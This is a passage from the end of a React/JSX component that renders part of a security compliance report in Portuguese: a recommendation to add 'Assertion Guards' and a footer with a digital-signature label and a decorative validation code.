                              Recomenda-se veementemente a incorporação das rotinas matemáticas blindadas (<code className="text-emerald-400 font-mono">Assertion Guards</code>) presentes no escopo técnico de conformidade deste dossiê. Tais alterações devolvem ao ecossistema a barreira de faturamento, isolando completamente a exposição de dados nativos na pasta raiz.
                            </p>
                          </div>

                          <div className="pt-6 border-t border-zinc-900 flex justify-between items-center font-mono">
                            <div className="space-y-1">
                              <span className="text-zinc-600 text-[10px] uppercase block">Assinatura Digital</span>
                              <span className="text-white text-xs font-bold tracking-wider uppercase">ARCHITECT ENGINE (CHL)</span>
                            </div>
                            <div className="text-right">
                              <span className="text-zinc-600 text-[10px] uppercase block">Validação Cryptográfica</span>
                              <span className="text-[#10b981] text-[11px]">8h5f-CHL-HASH-SUCCESS</span>
                            </div>
                          </div>
                        </div>
                      </motion.div>
                    )}
                  </div>
                )}

              </AnimatePresence>
            </div>
          </div>

        </div>
      </div>
    </div>
  );
}
